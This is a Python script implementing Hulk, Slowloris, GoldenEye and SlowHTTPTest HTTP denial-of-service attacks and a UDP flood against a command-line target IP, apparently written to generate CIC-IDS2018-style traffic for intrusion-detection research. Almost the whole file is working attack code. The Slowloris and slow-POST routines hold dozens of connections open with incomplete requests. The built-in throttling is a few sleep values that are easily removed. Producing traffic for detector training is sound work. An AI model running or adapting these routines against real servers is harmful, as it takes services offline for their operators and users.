"""
DoS Attack - HTTP Layer Denial of Service
Replicates CIC-IDS2018 DoS attack tool behaviors:
  - Hulk:         Rapid HTTP GET flood with randomized headers over keep-alive connections
  - Slowloris:    Hold connections open with incomplete HTTP headers (slow send)
  - GoldenEye:    HTTP GET/POST keep-alive flood with random cache-busting
  - SlowHTTPTest: Slow HTTP POST body transmission

Key: Each technique generates flows whose CICFlowMeter features differ from
     benign traffic (high pkt counts, unusual IAT, long durations, etc.).
"""

import socket
import threading
import time
import random
import string

# TCP receive buffer sizes → Init Fwd Win Byts feature.
# Values derived from CICIDS2018 training data analysis:
# SO_RCVBUF set BEFORE connect() controls TCP SYN window size.
_RCVBUF_HULK = 8192        # Training mode: 8192 (56.8% of TCP flows) ✓
_RCVBUF_GOLDENEYE = 8192   # Training mode: 8192 ✓
_RCVBUF_SLOWLORIS = 8192   # Training mode: 8192 ✓
_RCVBUF_SLOWHTTPTEST = 8192  # Training mode: 8192 ✓

# ──────────────────────────────────────────────────────────
# Randomization pools (mimic HULK / GoldenEye header variety)
# ──────────────────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/17.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0",
]

REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q=",
    "https://search.yahoo.com/search?p=",
    "https://www.reddit.com/r/",
    "https://en.wikipedia.org/wiki/",
    "https://stackoverflow.com/questions/",
    "https://github.com/search?q=",
]

ACCEPT_TYPES = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,*/*",
    "application/json, text/javascript, */*; q=0.01",
    "image/webp,image/apng,image/*,*/*;q=0.8",
]

ACCEPT_ENCODINGS = [
    "gzip, deflate, br",
    "gzip, deflate",
    "identity",
    "br",
]


def _random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def _random_url_params(n=3):
    """Generate random URL query parameters for cache busting."""
    params = "&".join(f"{_random_string(5)}={_random_string(8)}" for _ in range(n))
    return f"?{params}"


class DoSAttack:
    def __init__(self, target_ip, target_port=80, duration=60):
        self.target_ip = target_ip
        self.target_port = target_port
        self.target_url = f"http://{target_ip}:{target_port}/"
        self.duration = duration
        self.running = True
        self.request_count = 0
        self.lock = threading.Lock()

    def _inc_count(self, n=1):
        with self.lock:
            self.request_count += n

    # ──────────────────────────────────────────────────────
    # HULK — Rapid HTTP GET flood, NEW connection per request
    #
    # CICIDS2018 training data profile:
    #   Tot Fwd Pkts:    mean=2.5, median=3
    #   TotLen Fwd Pkts: mean=172.9, median=289.5
    #   Fwd Seg Size Min: 32  (TCP with timestamp options)
    #   Init Fwd Win Byts: median=26883
    #   Flow Duration:   short (rapid open/close)
    #   Dst Port: 80
    #
    # CRITICAL: The original HULK tool creates a NEW TCP connection
    # for each HTTP request. Each flow = SYN + ACK + GET (+ FIN)
    # = ~2-3 forward packets. Using keep-alive with 50-200 requests
    # creates completely wrong flow profiles that look benign.
    # ──────────────────────────────────────────────────────
    def hulk_attack(self):
        """HULK DoS: One HTTP GET request per NEW TCP connection.
        Rapidly opens connections, sends one request, closes.
        Each CICFlowMeter flow has ~2-3 fwd packets matching training data.
        
        VARIATION: Random ports, variable delays, and packet sizes for realism."""
        end_time = time.time() + self.duration
        # Variation pools for realistic attack patterns
        ports = [80, 8080, 8888, 3000, 5000, 443]
        
        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_HULK)
                
                # VARIATION: Random destination port
                attack_port = random.choice(ports)
                sock.connect((self.target_ip, attack_port))

                # VARIATION: Variable request size (1-5 requests per connection, weighted to 1)
                num_reqs = random.choices([1, 2, 3, 4, 5], weights=[70, 15, 10, 3, 2])[0]
                
                for _ in range(num_reqs):
                    path = "/" + _random_string(random.randint(5, 15)) + _random_url_params(random.randint(1, 8))
                    headers = (
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {self.target_ip}:{attack_port}\r\n"
                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                        f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
                        f"Accept-Encoding: {random.choice(ACCEPT_ENCODINGS)}\r\n"
                        f"Accept-Language: en-US,en;q=0.{random.randint(5,9)}\r\n"
                        f"Referer: {random.choice(REFERERS)}{_random_string(random.randint(4, 12))}\r\n"
                        f"Cache-Control: no-cache\r\n"
                        f"Connection: close\r\n"
                        f"\r\n"
                    )
                    sock.sendall(headers.encode())
                    self._inc_count()
                    
                    # VARIATION: Delay between multiple requests in same connection
                    if num_reqs > 1:
                        time.sleep(random.uniform(0.01, 0.1))

                # Read response briefly then close
                try:
                    sock.settimeout(0.3)
                    sock.recv(4096)
                except socket.timeout:
                    pass

                sock.close()
            except Exception:
                pass

            # THROTTLED: Increased delay for realistic rate (~3-5 flows per 60 sec from HTTP)
            time.sleep(random.uniform(2.0, 3.0))  # Was 0.005-0.05 (too aggressive)

    # ──────────────────────────────────────────────────────
    # SLOWLORIS — Hold connections open with incomplete headers
    #   Creates flows with LONG duration, LOW packet count,
    #   HIGH idle time, HIGH Flow IAT Mean/Max.
    # ──────────────────────────────────────────────────────
    def slowloris_attack(self):
        """Slowloris DoS: Open many sockets, send partial headers, keep alive.
        The key is to NEVER send the final \\r\\n\\r\\n so the server keeps waiting
        for the rest of the headers. Periodically send another header line to
        prevent the server from timing out the connection."""
        end_time = time.time() + self.duration
        sockets = []

        # Phase 1: Open initial batch of sockets with partial headers
        target_conns = min(150, max(50, self.duration))
        for _ in range(target_conns):
            if not self.running or time.time() >= end_time:
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_SLOWLORIS)
                sock.connect((self.target_ip, self.target_port))

                # Send INCOMPLETE HTTP request — NO final \r\n\r\n
                partial = (
                    f"GET /{_random_string(8)} HTTP/1.1\r\n"
                    f"Host: {self.target_ip}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Accept-Language: en-US,en;q=0.{random.randint(5,9)}\r\n"
                )
                sock.sendall(partial.encode())
                sockets.append(sock)
                self._inc_count()
            except Exception:
                pass

        # Phase 2: Keep connections alive by periodically sending header lines
        while self.running and time.time() < end_time:
            alive = []
            for sock in sockets:
                try:
                    # Send another partial header line to reset server timeout
                    header_line = f"X-a-{_random_string(4)}: {_random_string(8)}\r\n"
                    sock.sendall(header_line.encode())
                    alive.append(sock)
                    self._inc_count()
                except Exception:
                    pass  # Server closed the connection

            sockets = alive

            # Re-open dropped connections to maintain pressure
            deficit = target_conns - len(sockets)
            for _ in range(max(0, deficit)):
                if not self.running or time.time() >= end_time:
                    break
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_SLOWLORIS)
                    sock.connect((self.target_ip, self.target_port))
                    partial = (
                        f"GET /{_random_string(8)} HTTP/1.1\r\n"
                        f"Host: {self.target_ip}\r\n"
                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    )
                    sock.sendall(partial.encode())
                    sockets.append(sock)
                    self._inc_count()
                except Exception:
                    pass

            # Wait 10-15 seconds before next keep-alive round (slow is the point)
            time.sleep(random.uniform(10, 15))

        # Cleanup
        for sock in sockets:
            try:
                sock.close()
            except Exception:
                pass

    # ──────────────────────────────────────────────────────
    # GOLDENEYE — HTTP GET/POST flood, NEW connection per request
    #
    # CICIDS2018 training data profile:
    #   Tot Fwd Pkts:    mean=3.76, median=4
    #   TotLen Fwd Pkts: mean=359.6, median=358
    #   Fwd Seg Size Min: 32
    #   Init Fwd Win Byts: median=26883
    #   Flow Duration:   mean=11M µs (~11 sec), median=6.7M µs
    #   Dst Port: 80
    #
    # CRITICAL: The original GoldenEye tool opens a NEW TCP connection
    # per request. Using keep-alive creates wrong flow profiles.
    # ──────────────────────────────────────────────────────
    def goldeneye_attack(self):
        """GoldenEye DoS: One HTTP GET or POST per NEW TCP connection.
        Each flow has ~4 fwd packets and ~358 bytes, matching training data.
        60% GET, 40% POST. 2-3 second delays between NEW connections.
        
        VARIATION: Random ports, variable packet sizes for realistic patterns."""
        end_time = time.time() + self.duration
        ports = [80, 8080, 8888]  # Most traffic on 80, but vary for realism
        
        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_GOLDENEYE)
                
                # VARIATION: Random destination port (weighted to port 80)
                attack_port = random.choices([80, 8080, 8888], weights=[85, 10, 5])[0]
                sock.connect((self.target_ip, attack_port))

                # VARIATION: 60% GET, 40% POST (matching CICIDS2018 spec)
                if random.random() < 0.6:
                    # GET with cache busting (70-100 bytes typical)
                    path = "/" + _random_string(random.randint(4, 12)) + _random_url_params(random.randint(2, 10))
                    req = (
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {self.target_ip}:{attack_port}\r\n"
                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                        f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
                        f"Referer: {random.choice(REFERERS)}{_random_string(random.randint(4, 12))}\r\n"
                        f"Cache-Control: no-store, no-cache\r\n"
                        f"Pragma: no-cache\r\n"
                        f"Connection: close\r\n"
                        f"\r\n"
                    )
                else:
                    # POST with variable body size (50-400 bytes for variation)
                    body_size = random.randint(50, 400)
                    body = _random_string(body_size)
                    path = "/" + _random_string(random.randint(4, 10)) + _random_url_params(random.randint(1, 4))
                    req = (
                        f"POST {path} HTTP/1.1\r\n"
                        f"Host: {self.target_ip}:{attack_port}\r\n"
                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                        f"Content-Type: application/x-www-form-urlencoded\r\n"
                        f"Content-Length: {len(body)}\r\n"
                        f"Connection: close\r\n"
                        f"\r\n"
                        f"{body}"
                    )
                sock.sendall(req.encode())
                self._inc_count()

                # Read response briefly then close
                try:
                    sock.settimeout(0.3)
                    sock.recv(4096)
                except socket.timeout:
                    pass

                sock.close()
            except Exception:
                pass

            # CRITICAL: 2-3 second delay between NEW connections (matches CICIDS2018 GoldenEye tool)
            # This throttles the attack to realistic flow generation rate
            time.sleep(random.uniform(2.0, 3.0))

    # ──────────────────────────────────────────────────────
    # SlowHTTPTest — Slow POST body transmission
    #   Creates flows with LONG duration, moderate packet count,
    #   HIGH forward IAT (slow data drip), small packet sizes.
    # ──────────────────────────────────────────────────────
    def slowhttp_attack(self):
        """SlowHTTPTest DoS: Send POST with body transmitted a few bytes at a time.
        The server waits for the full Content-Length but we drip data very slowly,
        keeping the connection occupied for a long time."""
        end_time = time.time() + self.duration
        sockets = []

        while self.running and time.time() < end_time:
            # Open connections up to target count
            while len(sockets) < 50 and time.time() < end_time and self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_SLOWHTTPTEST)
                    sock.connect((self.target_ip, self.target_port))

                    # Announce a large POST body, but send it very slowly
                    content_length = random.randint(100000, 500000)
                    header = (
                        f"POST /{_random_string(8)} HTTP/1.1\r\n"
                        f"Host: {self.target_ip}\r\n"
                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                        f"Content-Type: application/x-www-form-urlencoded\r\n"
                        f"Content-Length: {content_length}\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                    )
                    sock.sendall(header.encode())
                    sockets.append(sock)
                    self._inc_count()
                except Exception:
                    pass

            # Drip data slowly (1-10 bytes at a time)
            alive = []
            for sock in sockets:
                try:
                    chunk = _random_string(random.randint(1, 10)).encode()
                    sock.sendall(chunk)
                    alive.append(sock)
                    self._inc_count()
                except Exception:
                    pass

            sockets = alive
            time.sleep(random.uniform(1, 3))

        for sock in sockets:
            try:
                sock.close()
            except Exception:
                pass

    # ──────────────────────────────────────────────────────
    # UDP FLOOD — Protocol diversity (not just TCP)
    #   FIXED: Reuse socket for multiple packets (fewer flows = realistic)
    #   Send 2-3 packets per flow, then rotate to new destination port/size
    #   Target: 3-5 flows/sec (not 100+)
    # ──────────────────────────────────────────────────────
    def udp_flood(self):
        """UDP Flood: Send bursts of UDP packets, reusing socket per burst.
        Creates fewer, more realistic flows. ~3-5 flows/sec."""
        end_time = time.time() + self.duration
        udp_ports = [53, 123, 161, 162, 514, 1900, 5353, 19132, 27015]
        
        while self.running and time.time() < end_time:
            try:
                # Create ONE socket for a burst
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(3)
                
                # Choose random destination port and payload size for this burst
                attack_port = random.choice(udp_ports)
                payload_size = random.randint(64, 512)  # Reduced from 10-1500
                payload = _random_string(payload_size)
                
                # Send 2-3 packets per burst (same flow)
                burst_packets = random.randint(2, 3)
                for _ in range(burst_packets):
                    sock.sendto(payload.encode(), (self.target_ip, attack_port))
                    self._inc_count()
                
                sock.close()
                
            except Exception:
                pass
            
            # Sleep 0.3-0.5 sec between bursts = ~2-3 UDP flows/sec
            time.sleep(random.uniform(0.3, 0.5))

    def run_attack(self, num_threads=1):
        """Run DoS attack with 1 thread (reduced from 5).
        Target: 3-5 flows/sec total."""
        print(f"[DoS] Starting attack on {self.target_ip}:{self.target_port} for {self.duration}s")
        print(f"[DoS] Techniques: Hulk + Slowloris + GoldenEye + SlowHTTPTest + UDP Flood (throttled)")
        print(f"[DoS] Using {num_threads} threads")

        techniques = [
            self.hulk_attack,
            self.slowloris_attack,
            self.goldeneye_attack,
            self.slowhttp_attack,
            self.udp_flood,
        ]

        threads = []
        for i in range(num_threads):
            technique = techniques[i % len(techniques)]
            t = threading.Thread(target=technique, name=f"DoS-{technique.__name__}-{i}")
            t.daemon = True
            t.start()
            threads.append(t)

        start_time = time.time()
        for t in threads:
            remaining = max(1, self.duration - (time.time() - start_time) + 5)
            t.join(timeout=remaining)

        self.running = False
        elapsed = time.time() - start_time
        print(f"[DoS] Attack completed in {elapsed:.2f}s — Sent {self.request_count} requests")


def run_dos(target_ip, target_port=80, duration=60, threads=5):
    """Convenience function to run DoS attack"""
    attack = DoSAttack(target_ip, target_port, duration)
    attack.run_attack(num_threads=threads)


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        target_ip = sys.argv[1]
        duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60
        run_dos(target_ip, duration=duration)
    else:
        print("Usage: python _1_dos_attack.py <target_ip> [duration]")
